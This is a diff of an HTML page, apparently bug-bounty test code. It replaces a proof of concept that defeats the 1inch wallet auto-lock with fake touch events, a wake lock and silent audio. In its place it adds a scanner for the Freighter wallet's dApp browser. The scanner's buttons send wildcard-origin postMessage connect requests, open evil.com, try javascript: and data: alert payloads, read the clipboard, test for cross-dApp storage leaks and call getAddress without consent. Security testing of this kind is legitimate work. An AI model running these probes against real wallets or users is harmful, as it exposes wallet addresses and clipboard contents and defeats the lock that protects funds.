@@ -1,103 +1,98 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>PoC Auto-Lock FIX</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Freighter dApp Browser - Vuln Scanner</title>
 <style>
-  body{font-family:-apple-system,monospace;background:#111;color:#0f0;padding:16px}
-  .box{border:1px solid #0f0;border-radius:12px;padding:12px;margin:12px 0}
-  #timer{font-size:48px;font-weight:900;text-align:center}
-  button{width:100%;padding:16px;font-size:18px;font-weight:bold;background:#0f0;border:0;border-radius:12px;margin-top:10px}
-  #log{font-size:12px;max-height:200px;overflow:auto;background:#000;padding:8px}
+body{background:#0a0a0a;color:#e5e5e5;font-family:monospace;padding:16px;word-break:break-all}
+h2{color:#d4ff32} h3{color:#a78bfa;margin-top:24px;border-bottom:1px solid #333;padding-bottom:6px}
+.box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:12px;margin:8px 0}
+.pass{color:#22c55e}.fail{color:#ef4444}.warn{color:#facc15}.info{color:#60a5fa}
+button{background:#d4ff32;color:#000;border:0;padding:10px 14px;border-radius:8px;font-weight:bold;margin:4px;cursor:pointer}
+pre{white-space:pre-wrap;font-size:12px}
 </style>
 </head>
 <body>
+<h2>🔍 Freighter dApp Browser Auditor v1.0</h2>
+<div class="box">Target: v1.25.28 (1788217816) | Mode: Passive + Active Checks</div>
 
-<h3>PoC Auto-Lock 1inch - FIX TIMER</h3>
+<h3>[1] Fingerprint Teknologi</h3>
+<div id="fingerprint" class="box">Loading...</div>
+
+<h3>[2] Wallet Injection Check</h3>
+<div id="injection" class="box"></div>
+
+<h3>[3] Auto Tests</h3>
+<div id="tests" class="box"></div>
+
+<h3>[4] PoC Buttons (klik satu-satu)</h3>
 <div class="box">
-  <div id="timer">00:00</div>
-  <div>Visibility: <b id="vis">unknown</b></div>
-  <div>Active: <b id="active">0s</b></div>
-  <div>WakeLock: <b id="wake">inactive</b></div>
+<button onclick="testPostMessage()">Test postMessage Origin Bypass</button>
+<button onclick="testOpenRedirect()">Test window.open</button>
+<button onclick="testJsScheme()">Test javascript: scheme</button>
+<button onclick="testDataScheme()">Test data:text/html</button>
+<button onclick="testIframe()">Test iframe escape</button>
+<button onclick="testClipboard()">Test Clipboard</button>
+<button onclick="testLocalStorage()">Test Cross-dApp Storage Leak</button>
+<button onclick="testFreighterAPI()">Test getAddress without consent</button>
 </div>
-
-<button id="btn">KLIK UNTUK MULAI TEST</button>
-<div class="box" id="log">LOG READY...<br></div>
+<div id="poc-result" class="box">Hasil PoC disini...</div>
 
 <script>
 const $ = id => document.getElementById(id);
-const logEl = $('log');
-function log(msg){
-  logEl.innerHTML += new Date().toLocaleTimeString() + ' - ' + msg + '<br>';
-  logEl.scrollTop = logEl.scrollHeight;
+function log(target, msg, type='info'){
+  const div = document.createElement('div');
+  div.innerHTML = `<span class="${type}">[${type.toUpperCase()}]</span> ${msg}`;
+  $(target).appendChild(div);
 }
 
-let startTime = Date.now();
-let wakeLock = null;
-let fakeInterval = null;
-let timerInterval = null;
-
-function updateTimer(){
-  const diff = Math.floor((Date.now() - startTime) / 1000);
-  const m = String(Math.floor(diff/60)).padStart(2,'0');
-  const s = String(diff%60).padStart(2,'0');
-  $('timer').textContent = `${m}:${s}`;
-  $('active').textContent = diff + 's';
-}
-
-// Timer anti-throttle iOS
-timerInterval = setInterval(updateTimer, 100);
-updateTimer();
-
-document.addEventListener('visibilitychange', ()=>{
-  $('vis').textContent = document.visibilityState;
-  log('visibilitychange: ' + document.visibilityState);
-});
-$('vis').textContent = document.visibilityState;
-
-$('btn').addEventListener('click', async () => {
-  startTime = Date.now(); // reset timer pas klik
-  log('User gesture diterima, mulai bypass...');
-  
-  // 1. WakeLock - harus di dalam click event di iOS
+// 1. FINGERPRINT
+(async ()=>{
+  let fp = `
+  <b>UserAgent:</b> ${navigator.userAgent}<br>
+  <b>WebView Type:</b> ${/wv/.test(navigator.userAgent)? 'Android WebView' : /iPhone|iPad/.test(navigator.userAgent)? 'WKWebView (iOS)' : 'Unknown'}<br>
+  <b>URL:</b> ${location.href}<br>
+  <b>Cookies:</b> ${navigator.cookieEnabled}<br>
+  <hr>
+  <b>window.freighter:</b> ${typeof window.freighter}<br>
+  <b>window.freighterApi:</b> ${typeof window.freighterApi}<br>
+  `;
+  let injected = Object.keys(window).filter(k=>k.toLowerCase().includes('freighter') || k.toLowerCase().includes('stellar'));
+  fp += `<b>Injected keys:</b> ${injected.join(', ') || 'none'}<br>`;
   try{
-    if('wakeLock' in navigator){
-      wakeLock = await navigator.wakeLock.request('screen');
-      $('wake').textContent = 'ACTIVE';
-      log('WakeLock ACTIVE');
-      wakeLock.addEventListener('release', ()=>{ $('wake').textContent='released'; });
-    } else {
-      log('WakeLock tidak support di browser ini');
+    if(window.freighterApi){
+      fp += `<pre>${JSON.stringify(Object.keys(window.freighterApi), null, 2)}</pre>`;
     }
-  }catch(e){ log('WakeLock error: '+e.message); }
+  }catch(e){ fp += `Error: ${e.message}` }
+  $('fingerprint').innerHTML = fp;
+})();
 
-  // 2. Fake activity - ini inti bug nya
-  if(fakeInterval) clearInterval(fakeInterval);
-  fakeInterval = setInterval(()=>{
-    window.dispatchEvent(new Event('touchstart'));
-    document.dispatchEvent(new Event('mousemove'));
-    // ini yang bikin auto-lock 1inch gagal reset
-  }, 800);
-  log('Fake activity loop jalan tiap 800ms');
+// 2. INJECTION
+(() => {
+  let html = '';
+  [['ReactNativeWebView', typeof window.ReactNativeWebView], ['webkit.messageHandlers', typeof window.webkit?.messageHandlers], ['freighterApi', typeof window.freighterApi]].forEach(([n,t])=>{
+    html += `<div class="${t!=='undefined'?'pass':'fail'}">${n}: ${t}</div>`;
+  });
+  $('injection').innerHTML = html;
+})();
 
-  // 3. Silent audio - harus setelah click di iOS
-  try{
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    gain.gain.value = 0.0001;
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    osc.start();
-    log('Silent audio started (gain 0.0001)');
-  }catch(e){ log('Audio error: '+e.message); }
+// 3. AUTO
+(() =>{
+  log('tests', `Protocol: ${location.protocol}`, location.protocol!== 'https:'? 'warn' : 'info');
+  try{ localStorage.setItem('__test', Date.now()); log('tests', `localStorage OK: ${localStorage.getItem('__test')} - Cek shared antar dApp?`, 'warn'); }catch(e){ log('tests', `localStorage blocked: ${e.message}`, 'pass'); }
+  window.addEventListener('message', (e)=>{ log('poc-result', `postMessage from ${e.origin}: ${JSON.stringify(e.data).slice(0,200)}`, 'warn'); });
+})();
 
-  $('btn').textContent = 'TEST BERJALAN... JANGAN SENTUH HP';
-  log('TEST MULAI. Diamkan 2 menit. Kalau wallet tidak lock = BUG CONFIRMED');
-});
-
-log('Siap. Klik tombol di atas untuk mulai.');
+function out(msg){ const d=document.createElement('div'); d.innerHTML=`${new Date().toLocaleTimeString()} ${msg}`; $('poc-result').prepend(d); }
+function testPostMessage(){ window.postMessage({type:'CONNECT_WALLET', origin:'https://aquarius.org'}, '*'); window.parent.postMessage({method:'freighter:connect'}, '*'); out('Sent postMessage * - cek apakah validasi origin?'); }
+function testOpenRedirect(){ const r=window.open('https://evil.com','_blank'); out(`window.open: ${r? 'VULN bisa buka arbitrary URL' : 'Blocked (good)'}`); }
+function testJsScheme(){ try{ location.href='javascript:alert(document.domain)'; out('javascript: mencoba exec - jika alert = VULN'); }catch(e){ out(`blocked: ${e.message}`); } }
+function testDataScheme(){ try{ const win=window.open('data:text/html,<h1>Hacked</h1><script>alert(1)</script>'); out(`data: URI: ${win? 'VULN' : 'Blocked'}`); }catch(e){ out(`blocked: ${e.message}`); } }
+function testIframe(){ const ifr=document.createElement('iframe'); ifr.src='https://google.com'; document.body.appendChild(ifr); setTimeout(()=>{ out(`iframe external: ${ifr.contentWindow?'created':'blocked'}`); ifr.remove(); },1000); }
+async function testClipboard(){ try{ const txt=await navigator.clipboard.readText(); out(`Clipboard READ SUCCESS: ${txt.slice(0,50)} - VULN!`); }catch(e){ out(`Clipboard blocked (good): ${e.message}`); } }
+function testLocalStorage(){ localStorage.setItem('dapp1_secret','SECRET_FROM_DAPP1'); out('Wrote localStorage[dapp1_secret]. Buka dApp lain, kalau dia bisa baca = Cross-dApp Leak HIGH'); }
+async function testFreighterAPI(){ try{ if(!window.freighterApi){ out('freighterApi not found'); return;} const addr=await window.freighterApi.getAddress(); out(`getAddress TANPA consent SUCCESS: ${JSON.stringify(addr)} - CRITICAL!`); }catch(e){ out(`getAddress blocked need consent (good): ${e.message}`); } }
 </script>
 </body>
 </html>
